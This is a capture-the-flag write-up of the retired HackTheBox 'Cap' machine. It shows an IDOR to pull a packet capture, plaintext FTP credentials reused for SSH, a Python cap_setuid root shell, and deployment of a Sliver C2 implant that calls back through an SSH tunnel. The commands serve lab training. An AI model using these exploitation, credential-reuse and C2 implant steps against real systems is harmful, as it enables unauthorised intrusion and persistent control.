# Cap - HackTheBox

![Cap Pwned](./pwned.png)

## Machine Info

| Property | Value |
|----------|-------|
| Name | Cap |
| OS | Linux |
| Difficulty | Easy |
| Release Date | June 2021 |
| Status | **Retired** |
| IP | 10.129.3.86 |

## Skills Required

- Web Application Enumeration
- PCAP Analysis
- Basic Linux

## Skills Learned

- IDOR (Insecure Direct Object Reference) vulnerability exploitation
- Network traffic analysis with tcpdump
- Linux capabilities enumeration
- Python capability-based privilege escalation
- Sliver C2 framework for post-exploitation

## Summary

Cap is an Easy-rated Linux machine that demonstrates IDOR vulnerabilities and Linux capabilities-based privilege escalation. The machine features a security dashboard web application that allows downloading packet captures. By exploiting an IDOR vulnerability, credentials can be extracted from network traffic. The privilege escalation leverages Python's `cap_setuid` capability to gain root access.

## Initial Access

### Reconnaissance

```bash
nmap -sV -sC -p- 10.129.3.86
```

**Open Ports:**
- 21/tcp - FTP (vsftpd 3.0.3)
- 22/tcp - SSH (OpenSSH 8.2p1 Ubuntu)
- 80/tcp - HTTP (Gunicorn)

### Web Application Analysis

The web application is a "Security Dashboard" running on Gunicorn with the following endpoints:
- `/` - Dashboard
- `/capture` - Security Snapshot (5 Second PCAP + Analysis)
- `/ip` - IP Config
- `/netstat` - Network Status

### IDOR Vulnerability

The `/capture` endpoint redirects to `/data/<id>` where packet captures can be downloaded. Testing for IDOR:

```bash
curl -s http://10.129.3.86/download/0 -o 0.pcap
```

The application does not properly validate authorization for PCAP file access. ID `0` contains network traffic with sensitive data.

### Credential Extraction

Analyzing the PCAP file reveals FTP credentials in plaintext:

```bash
tcpdump -r 0.pcap -A 2>/dev/null | grep -i -A 5 -B 5 'USER\|PASS'
```

**Credentials Found:**
```
USER nathan
PASS Buck3tH4TF0RM3!
```

### SSH Access

The FTP credentials are reused for SSH access:

```bash
ssh nathan@10.129.3.86
# Password: Buck3tH4TF0RM3!
```

**User Flag:** `c7fe401a6b7ea7abed7206da99b45c99`

## Privilege Escalation

### Enumeration

Checking for Linux capabilities:

```bash
getcap /usr/bin/python3.8
```

**Output:**
```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

Python3.8 has the `cap_setuid` capability, allowing it to change the effective user ID.

### Exploitation

The `cap_setuid` capability allows Python to execute `setuid(0)` to become root:

```bash
python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**Root Flag:** Obtained

## Post-Exploitation with Sliver C2

### Network Routing Setup

For post-exploitation practice with Sliver C2, network routing was configured:

**Environment:**
- Kali Machine: `192.168.36.172` (HTB VPN IP: `10.10.15.1`)
- Sliver Server: `192.168.36.209:4443`
- Cap Target: `10.129.3.86`

**SSH Tunnel:**
```bash
ssh -f -N -L 10.10.15.1:443:127.0.0.1:4443 debian@192.168.36.209
```

This allows the Cap machine to connect back through the HTB VPN to the Sliver server.

### Sliver Implant Deployment

**Generate implant:**
```
mtls -L 0.0.0.0 -l 4443
generate --mtls 10.10.15.1:443 --os linux --arch amd64 --save /tmp/htb_implant --skip-symbols
```

**Transfer and execute:**
```bash
scp /tmp/htb_implant nathan@10.129.3.86:/tmp/htb_implant
ssh nathan@10.129.3.86 'chmod +x /tmp/htb_implant && /tmp/htb_implant &'
```

### OPSEC-Safe Enumeration

Using Sliver's `execute` command for non-interactive enumeration:

```
execute -o getcap /usr/bin/python3.8
execute -o id
```

### Capability-Based Privilege Escalation via Sliver

Creating a Python script for privilege escalation:

```python
import os
os.setuid(0)
print(open("/root/root.txt").read())
```

Upload and execute:
```
upload /tmp/privesc.py /tmp/privesc.py
execute -o /usr/bin/python3.8 /tmp/privesc.py
```

## Key Takeaways

1. **IDOR vulnerabilities** can expose sensitive data - always test sequential IDs
2. **Network traffic analysis** can reveal cleartext credentials
3. **Linux capabilities** provide an alternative to traditional SUID privilege escalation
4. **OPSEC considerations** in post-exploitation: avoid interactive shells, use `execute` for single commands
5. **Network pivoting** is essential when C2 infrastructure is not directly reachable from target

## Attack Path Summary

1. **Enumeration** - Discovered web application with PCAP download functionality
2. **IDOR Exploitation** - Accessed PCAP file ID 0 without authorization
3. **Credential Extraction** - Found FTP credentials in plaintext network traffic
4. **Initial Access** - SSH authentication with reused credentials
5. **Capabilities Enumeration** - Identified Python with `cap_setuid` capability
6. **Privilege Escalation** - Used Python's setuid capability to become root
7. **Post-Exploitation** - Deployed Sliver C2 implant for operational practice

## Services Discovered

| Port | Service | Version |
|------|---------|---------|
| 21 | FTP | vsftpd 3.0.3 |
| 22 | SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 |
| 80 | HTTP | Gunicorn |

## CVEs & Vulnerabilities

| Type | Description |
|------|-------------|
| IDOR | Insecure Direct Object Reference in `/download/<id>` endpoint |
| Cleartext Credentials | FTP credentials transmitted without encryption |
| Excessive Capabilities | Python binary with `cap_setuid` capability |

## Tools Used

- `nmap` - Port scanning
- `curl` - Web enumeration
- `tcpdump` - PCAP analysis
- `ssh` - Remote access
- `getcap` - Linux capabilities enumeration
- `Sliver` - Command and Control framework

## Tags

`linux` `easy` `idor` `pcap` `credentials` `capabilities` `cap_setuid` `python` `sliver` `c2` `post-exploitation`
